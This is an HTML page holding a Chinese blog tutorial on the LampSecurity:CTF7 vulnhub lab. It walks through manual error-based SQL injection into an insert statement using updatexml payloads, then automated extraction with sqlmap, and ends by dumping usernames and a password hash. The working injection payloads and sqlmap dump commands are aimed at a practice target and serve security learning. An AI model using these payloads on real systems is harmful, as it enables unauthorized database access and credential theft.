@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>渗透测试：详解sqlmap进行POST注入、基于insert的注入（以vulnhub靶机LampSecurity:CTF7为例） - 编程鬼谷子的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="渗透测试：详解sqlmap进行POST注入、基于insert的注入（以vulnhub靶机LampSecurity:CTF7为例）" />
+<meta property="og:description" content="目录
+写在开头
+漏洞发现
+手工insert型的报错注入
+sqlmap进行POST注入
+总结与思考
+写在开头 在上一篇对LampSecurity:CTF7进行打靶的时候，获得ssh的登录凭据是通过拿到apache的shell权限后登录mysql数据库，在数据库中找到了登录凭据。靶机地址、打靶过程详见：
+红队打靶：LampSecurity:CTF7打靶思路详解（vulnhub）
+如果读者对这个靶机不敢兴趣，单纯想学习sql注入的知识，也可以继续往后看学习使用sqlmap进行POST注入和基于报错的insert型的手工注入。只不过可能读者就得自己寻找案例进行复现了。
+上一篇博客中我们登录管理后台是通过8080端口的登录界面，利用SQL注入的万能密码登录成功。我们并没有对80端口进行渗透研究。同时80端口也存在一个注册和登录页面，这些地方也是有可能存在漏洞的。我们可以注册一个账号，然后研究后续的操作页面是否存在漏洞。
+于是我试了试，发现一个确实有一个页面存在SQL注入，可以通过对一些文本框进行POST型的SQL注入，直接把数据库中储存的ssh凭据注入出来。注册一个账号之后，点击Resources——&gt;Training——&gt;Register即可
+如下图就是存在SQL注入漏洞的界面：
+漏洞发现 首先肯定要考虑，打靶过程中，漏洞是如何发现的。这里就是试出来的，看见输入框我们就可以输入单引号&#39; ，看看回显会不会报错，如果出现有关sql的报错，那就说明我们输入的单引号参与了SQL的拼接，很有可能出现注入漏洞。如下图：
+我们在每个输入框都输入单引号（Email行要求必须符合email格式），点击Register，看看有没有报错，根据报错信息寻找出现sql注入的位置，如下图：
+还真报错了，看来确实存在SQL注入漏洞。根据这个报错信息我们还可以确认这是MySQL数据库，同时对应的SQL语句是insert型，另外基本每个文本框都可以进行注入。接下来我们开始手工测试。
+手工insert型的报错注入 虽然sqlmap很强大，但工具终究知识工具，我们还是要深入理解漏洞的原理，才可以更深入的使用工具，不仅仅当脚本小子。于是我们就这个案例进行手工注入，研究insert语句相关的单引号闭合构造和基于报错的注入方式。首先我们先根据报错信息，看这个insert的语句：
+insert into payment set firstname=&#39; 这里是我们填写First Name的位置 &#39;,lastname = &#39;aaa&#39;; 问题就在于我们如何将这里是我们填写First Name的位置改写为我们的payload，构造合理的闭合。如果我们在First Name的位置填写如下的字符串，即可构成闭合：
+a&#39; or 此处填写我们想执行的语句 or &#39;
+那么刚才的insert语句就会变为：
+insert into payment set firstname=&#39; a&#39; or 此处填写我们想执行的语句 or &#39; &#39;,lastname = &#39;aaa&#39;;
+这样的话，就成功构造了闭合，问题就是我们想执行的语句如何填写，可以使用基于报错的注入，让报错回显当前的数据库database()，那么报错的函数就是：
+updatexml(1,concat(0x7e,database()),0)
+这里0x7e是符号&#39;~&#39;，具体updatexml相关的报错注入函数详见：SQL注入相关问题总结 完整的payload是：
+a&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;
+因此，原来的insert语句被我们构造的payload拼接之后，就会形成如下的语句：
+insert into payment set firstname=&#39;a&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;&#39;,lastname = &#39;aaa&#39;; 理论知识就讲完了，接下来我们开始实践。首先按照刚才理论讲的，在First Name文本框中输入我们的payload，其他文本框随便填，如下图：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bcguiguzi.github.io/posts/e9b49aea30d57720551cd062fd5dede8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-22T11:31:52+08:00" />
+<meta property="article:modified_time" content="2023-06-22T11:31:52+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程鬼谷子的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">渗透测试：详解sqlmap进行POST注入、基于insert的注入（以vulnhub靶机LampSecurity:CTF7为例）</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <p id="main-toc"><strong>目录</strong></p> 
+<p id="%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4-toc" style="margin-left:0px;"><a href="#%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4" rel="nofollow">写在开头</a></p> 
+<p id="%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-toc" style="margin-left:0px;"><a href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0" rel="nofollow">漏洞发现</a></p> 
+<p id="%E6%89%8B%E5%B7%A5insert%E5%9E%8B%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-toc" style="margin-left:0px;"><a href="#%E6%89%8B%E5%B7%A5insert%E5%9E%8B%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5" rel="nofollow">手工insert型的报错注入</a></p> 
+<p id="sqlmap%E8%BF%9B%E8%A1%8CPOST%E6%B3%A8%E5%85%A5-toc" style="margin-left:0px;"><a href="#sqlmap%E8%BF%9B%E8%A1%8CPOST%E6%B3%A8%E5%85%A5" rel="nofollow">sqlmap进行POST注入</a></p> 
+<p id="%E6%80%BB%E7%BB%93%E4%B8%8E%E6%80%9D%E8%80%83-toc" style="margin-left:0px;"><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E6%80%9D%E8%80%83" rel="nofollow">总结与思考</a></p> 
+<h2 id="%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4">写在开头</h2> 
+<p> 在上一篇对LampSecurity:CTF7进行打靶的时候，获得ssh的登录凭据是通过拿到apache的shell权限后登录mysql数据库，在数据库中找到了登录凭据。靶机地址、打靶过程详见：</p> 
+<p><a class="link-info" href="https://blog.csdn.net/Bossfrank/article/details/131324929" title="红队打靶：LampSecurity:CTF7打靶思路详解（vulnhub）">红队打靶：LampSecurity:CTF7打靶思路详解（vulnhub）</a></p> 
+<p><strong> 如果读者对这个靶机不敢兴趣，单纯想学习sql注入的知识，也可以继续往后看学习使用sqlmap进行POST注入和基于报错的insert型的手工注入</strong>。只不过可能读者就得自己寻找案例进行复现了。</p> 
+<p>上一篇博客中我们登录管理后台是通过8080端口的登录界面，利用SQL注入的万能密码登录成功。我们并没有对80端口进行渗透研究。同时80端口也存在一个注册和登录页面，这些地方也是有可能存在漏洞的。我们可以注册一个账号，然后研究后续的操作页面是否存在漏洞。</p> 
+<p class="img-center"><img alt="" height="471" src="https://images2.imgbox.com/2f/b0/nd9w80Xl_o.png" width="1162"></p> 
+<p>于是我试了试，发现一个确实有一个页面存在SQL注入，可以通过对一些文本框进行POST型的SQL注入，直接把数据库中储存的ssh凭据注入出来。注册一个账号之后，点击Resources——&gt;Training——&gt;Register即可</p> 
+<p class="img-center"><img alt="" height="486" src="https://images2.imgbox.com/64/98/uWBzYlGy_o.png" width="1140"></p> 
+<p>如下图就是存在SQL注入漏洞的界面：</p> 
+<p class="img-center"><img alt="" height="458" src="https://images2.imgbox.com/a4/0f/AZi8d4y9_o.png" width="422"></p> 
+<h2 id="%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0">漏洞发现</h2> 
+<p> 首先肯定要考虑，打靶过程中，漏洞是如何发现的。这里就是试出来的，看见输入框我们就可以输入单引号' ，看看回显会不会报错，如果出现有关sql的报错，那就说明我们输入的单引号参与了SQL的拼接，很有可能出现注入漏洞。如下图：</p> 
+<p class="img-center"><img alt="" height="550" src="https://images2.imgbox.com/53/25/z1Bx1cr0_o.png" width="458"></p> 
+<p> 我们在每个输入框都输入单引号（Email行要求必须符合email格式），点击Register，看看有没有报错，根据报错信息寻找出现sql注入的位置，如下图：</p> 
+<p class="img-center"><img alt="" height="286" src="https://images2.imgbox.com/8e/eb/wTsJoRKl_o.png" width="885"></p> 
+<p> 还真报错了，看来确实存在SQL注入漏洞。根据这个报错信息我们还可以<strong>确认这是MySQL数据库，同时对应的SQL语句是insert型</strong>，另外基本每个文本框都可以进行注入。接下来我们开始手工测试。</p> 
+<h2 id="%E6%89%8B%E5%B7%A5insert%E5%9E%8B%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">手工insert型的报错注入</h2> 
+<p> 虽然sqlmap很强大，但工具终究知识工具，我们还是要深入理解漏洞的原理，才可以更深入的使用工具，不仅仅当脚本小子。于是我们就这个案例进行手工注入，研究insert语句相关的单引号闭合构造和基于报错的注入方式。首先我们先根据报错信息，看这个insert的语句：</p> 
+<pre><code class="language-sql">insert into payment set firstname=' 这里是我们填写First Name的位置 ',lastname = 'aaa';</code></pre> 
+<p>问题就在于我们如何将<strong>这里是我们填写First Name的位置</strong>改写为我们的payload，构造合理的闭合。如果我们在First Name的位置填写如下的字符串，即可构成闭合：</p> 
+<blockquote> 
+ <p>a' or 此处填写我们想执行的语句 or '</p> 
+</blockquote> 
+<p> 那么刚才的insert语句就会变为：</p> 
+<blockquote> 
+ <p>insert into payment set firstname='      a' or 此处填写我们想执行的语句 or '     ',lastname = 'aaa';</p> 
+</blockquote> 
+<p> 这样的话，就成功构造了闭合，问题就是我们想执行的语句如何填写，可以使用基于报错的注入，让报错回显当前的数据库database()，那么报错的函数就是：</p> 
+<blockquote> 
+ <p>updatexml(1,concat(0x7e,database()),0)</p> 
+</blockquote> 
+<p>这里0x7e是符号'~'，具体updatexml相关的报错注入函数详见：<a class="link-info" href="https://blog.csdn.net/Bossfrank/article/details/130297924" title="SQL注入相关问题总结">SQL注入相关问题总结</a> 完整的payload是：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,database()),0) or '</p> 
+</blockquote> 
+<p> 因此，原来的insert语句被我们构造的payload拼接之后，就会形成如下的语句：</p> 
+<pre><code class="language-sql">insert into payment set firstname='a' or updatexml(1,concat(0x7e,database()),0) or '',lastname = 'aaa';</code></pre> 
+<p>理论知识就讲完了，接下来我们开始实践。首先按照刚才理论讲的，在First Name文本框中输入我们的payload，其他文本框随便填，如下图：</p> 
+<p class="img-center"><img alt="" height="559" src="https://images2.imgbox.com/2c/c8/6eB8JMnN_o.png" width="459"></p> 
+<p> 点击Register之后回显如下，通过报错注入，喜提数据库名：</p> 
+<p class="img-center"><img alt="" height="285" src="https://images2.imgbox.com/a7/7c/6Bu8R0TP_o.png" width="826"></p> 
+<p> 现在我们也知道数据库名是'website'了，接下来就是把payload中的database()换为我们想要执行的SQL语句，可以利用information_schema这个数据库来寻找相关信息，首先我们如果想查找website这个数据库里面有哪些表，可以用如下的SQL语句：</p> 
+<pre><code class="language-sql">select table_name from information_schema.tables where table_schema='website';</code></pre> 
+<p>因此，我们的payload就是：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='website')),0) or '</p> 
+</blockquote> 
+<p>把如上的payload输入到First Name中，其他文本框随便填，回显如下：</p> 
+<p class="img-center"><img alt="" height="256" src="https://images2.imgbox.com/d4/d2/Jf2jH86N_o.png" width="838"></p> 
+<p> 可恶，他说子查询回显了超过一行的请求，看来基于报错的查询应该是只能看到回显一行的请求，那么我们可以在语句中增加limit 0,1表示从第0个结果开始，看一个结果（0是起始位置，1是查询数量），payload修改为：</p> 
+<blockquote> 
+ <p> a' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='website' limit 0,1)),0) or '</p> 
+</blockquote> 
+<p> 把如上的payload输入到First Name中，其他文本框随便填，这次回显如下：</p> 
+<p class="img-center"><img alt="" height="266" src="https://images2.imgbox.com/17/49/krOAJLyd_o.png" width="806"></p> 
+<p> 非常好，现在我们已经找到了website数据库中的第0个表名，名称为'contact'，我们的目标是找到与ssh登录相关的表，然后查询里面的内容，因此我们需要继续查找其他的表。经过多次反复尝试，终于找到第8个表的表名为'users'，这很可能是我们想要的，payload如下：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='website' limit 8,1)),0) or '</p> 
+</blockquote> 
+<p class="img-center"><img alt="" height="268" src="https://images2.imgbox.com/c3/82/oqCkzRyC_o.png" width="811"></p> 
+<p> 现在users很可能就是我们需要的表，知道表名之后，我们要查找users表中有哪些列，对应的SQL语句是，注意由于只能回显一行数据，因此需要limit 0,1：</p> 
+<pre><code class="language-sql">select column_name from information_schema.columns where table_name='users' limit 0,1;</code></pre> 
+<p>payload修改为：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),0) or '</p> 
+</blockquote> 
+<p> 把如上的payload输入到First Name中，其他文本框随便填，回显如下：</p> 
+<p class="img-center"><img alt="" height="277" src="https://images2.imgbox.com/af/04/83og9BR4_o.png" width="828"></p> 
+<p> 成功得到，在users这个表中，第0列的列名为'user_id'我们对'user_id'并不是很关心，我们更关心的是表中有没有用户名和密码这样的列。经过修改limit后面的数字，最终找到了第8列的列名是'username'。如下：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 8,1)),0) or '</p> 
+</blockquote> 
+<p class="img-center"><img alt="" height="247" src="https://images2.imgbox.com/a5/95/CTX2fiCg_o.png" width="843"></p> 
+<p> 也找到了第9列的列名是'password'。如下：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 9,1)),0) or '</p> 
+</blockquote> 
+<p class="img-center"><img alt="" height="258" src="https://images2.imgbox.com/f1/0f/S46hdGF1_o.png" width="836"></p> 
+<p> 我只能说，users这个表真是不负众望。把username和password都存在里面了。那么我们就查找username的第一个数据吧：</p> 
+<pre><code class="language-sql">select username from users limit 0,1;</code></pre> 
+<p> payload是：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or '</p> 
+</blockquote> 
+<p>回显如下：</p> 
+<p class="img-center"><img alt="" height="252" src="https://images2.imgbox.com/bd/bb/vwLpUn4Z_o.png" width="847"></p> 
+<p>非常amazing啊，找到了第一个账号名为brian@localhost.localdomain ，那么查找第一个密码的语句就是：</p> 
+<pre><code class="language-sql">select password from users limit 0,1;</code></pre> 
+<p>payload是：</p> 
+<blockquote> 
+ <p> a' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or '</p> 
+</blockquote> 
+<p class="img-center"><img alt="" height="260" src="https://images2.imgbox.com/53/f4/x1zCKYzb_o.png" width="846"></p> 
+<p> 这样我们就喜提一串密码，这应该是md5加密的结果，为e22f07b17f98e0d9d364584ced0e3c1，当然，你也可以不用limit，而用查找username为brian@localhost.localdomain的密码，SQL语句为：</p> 
+<pre><code class="language-sql">select password from users where username = 'brian@localhost.localdomain';</code></pre> 
+<p> payload是：</p> 
+<blockquote> 
+ <p>a' or updatexml(1,concat(0x7e,(select password from users where username = 'brian@localhost.localdomain')),0) or '</p> 
+</blockquote> 
+<p>也可以得到完全相同的结果。如果想得到其他账号，也可以继续注入，修改limit后面的数字就行了。如果为了打靶的话（不打这个靶机的读者忽略我这段话），还可以找个在线网站直接破解一下这个md5，然后直接登录ssh，不是本文重点，读者如果打靶的话可以走这条路，连shell都不用获取了，我感觉这个思路比拿shell要更好，因为拿到shell的话还要恰巧找到那个db.php发现数据库的密码为空，感觉有点凑巧。</p> 
+<p>手工注入到这里就讲解完毕了，这个过程可以说非常痛苦啊。尤其是确定第几个表可能有用户信息、第几列的列名含有用户名和密码的过程，要不断的修改limit后的数字，非常多的重复劳动。同时这个页面要填的信息还贼tm多，每次吧First Name填写payload之后，还要把其他的文本框也填上垃圾字符，才能点Rigister，非常痛苦。<strong>建议读者手工测试的时候用burpsuite抓个包，把POST请求发送到Repeater，每次只要修改POST的请求体中的一项，然后重放就可以了，省去了每次都对其他文本框输入垃圾信息的过程</strong>。那么我既然都抓包了，为啥不直接用sqlmap对抓的包进行测试呢？接下来就详解sqlmap进行自动注入的过程。</p> 
+<h2 id="sqlmap%E8%BF%9B%E8%A1%8CPOST%E6%B3%A8%E5%85%A5">sqlmap进行POST注入</h2> 
+<p> 要用sqlmap进行POST注入，首先要抓包，把抓到的包存为一个txt文件。抓包（提交register的包）过程我不讲，读者用burpsuite抓一下就行了，抓下来的POST请求包如下：</p> 
+<blockquote> 
+ <p>POST /register_scr HTTP/1.1<br> Host: 192.168.200.145<br> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0<br> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br> Accept-Encoding: gzip, deflate<br> Content-Type: application/x-www-form-urlencoded<br> Content-Length: 109<br> Origin: http://192.168.200.145<br> Connection: close<br> Referer: http://192.168.200.145/register&amp;id=2<br> Cookie: PHPSESSID=4vrt29qolf5uiv7g3n5tjs4ps1<br> Upgrade-Insecure-Requests: 1</p> 
+ <p></p> 
+ <p>id=2&amp;fname=Boss&amp;lname=Frank&amp;email=a%40b.com&amp;street=a&amp;city=beijing&amp;state=beijing&amp;zip=1&amp;phone=1&amp;ccn=1&amp;seccode=1source /root/peda/peda.py</p> 
+</blockquote> 
+<p> 把他存为packege.txt，如下：</p> 
+<p class="img-center"><img alt="" height="438" src="https://images2.imgbox.com/57/9f/0LCW9z9m_o.png" width="1200"></p> 
+<p> 然后就可以用sqlmap注入了，我们先把存在的数据库注入出来，-r表示对文本文件进行注入，--dbs表示寻找所有的数据库。</p> 
+<pre><code class="language-bash">sqlmap -r packet.txt --dbs </code></pre> 
+<p class="img-center"><img alt="" height="465" src="https://images2.imgbox.com/ba/69/EM5xoq8M_o.png" width="442"></p> 
+<p> 找到了四个数据库名，website最有可能是有信息的数据库，因此我们再查看website这个数据库中有哪些表：</p> 
+<pre><code class="language-bash">sqlmap -r packet.txt -D website --tables</code></pre> 
+<p>-D指定数据库，--tables显示其中的表名，结果如下：</p> 
+<p class="img-center"><img alt="" height="431" src="https://images2.imgbox.com/b6/9e/yor3eASW_o.png" width="525"></p> 
+<p> 非常amazing，9个表的名称直接就注入出来了，然后我们查看users里面有哪些列，命令如下：</p> 
+<pre><code class="language-bash">sqlmap -r packet.txt -D website -T users --columns
+</code></pre> 
+<p> -T指定表名，--columns指定查找列名，结果如下：</p> 
+<p><img alt="" height="732" src="https://images2.imgbox.com/6e/07/Qj32TbtE_o.png" width="928"></p> 
+<p> 所有列的名称都看到了，我们关心的是password和username，继续查看其中的具体内容：</p> 
+<pre><code class="language-bash">sqlmap -r packet.txt -D website -T users -C username,password --dump
+</code></pre> 
+<p>-C选择列名，--dump把其中的结果都dump出来，运行这个指令后，还会问你要不要进行密码破解等选项，直接默认敲回车就行了：</p> 
+<p><img alt="" height="658" src="https://images2.imgbox.com/b6/70/bvIHL5j9_o.png" width="1122"></p> 
+<p> 这样用户名和密码就都注入出来了，还可以进行md5的破解。</p> 
+<h2 id="%E6%80%BB%E7%BB%93%E4%B8%8E%E6%80%9D%E8%80%83">总结与思考</h2> 
+<p>有关insert类型的注入全过程和使用sqlmap进行POST注入的内容就讲解到这里了。虽然sqlmap一把梭感觉很爽，但核心还是要理解sql注入的原理。如果是初学者，建议在进行手工注入之后，再学习sqlmap的使用。</p> 
+<p>在进行手工注入的时候，首先先要确定是否存在sql注入，可以<strong>输入单引号'观察是否有报错，报错信息有没有提示数据库的类型和语句。如何构造闭合也是注入的关键，无论是select还是insert或update，进行sql注入的本质都一样，都是构造闭合，执行我们的payload</strong>。</p> 
+<p>本文到这里就结束了，如果读者觉得我写的还不错的话，恳请多多点赞关注支持。希望大家一起努力，共同见证网安菜鸟的成长之路！</p>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/83b57778cb6f23b7b07b253d68ce170e/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">HTML5知识点总结 ---- HTML5简介、HTML5新增语义化标签（新增布局标签、状态标签、列表标签、文本标签）、新增表单功能、新增多媒体标签、新增全局属性和HTML5兼容性处理</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/992d8bc7f729d5c5325ffb38ad573630/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">【ensp的OSPF多区域配置】</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程鬼谷子的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
